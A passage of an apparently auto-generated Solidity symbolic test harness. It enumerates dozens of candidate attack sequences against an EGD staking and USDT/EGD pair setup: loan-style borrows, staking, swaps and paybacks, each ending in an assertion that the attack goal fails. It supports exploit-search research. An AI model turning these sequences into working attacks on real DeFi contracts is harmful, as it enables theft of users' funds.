        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
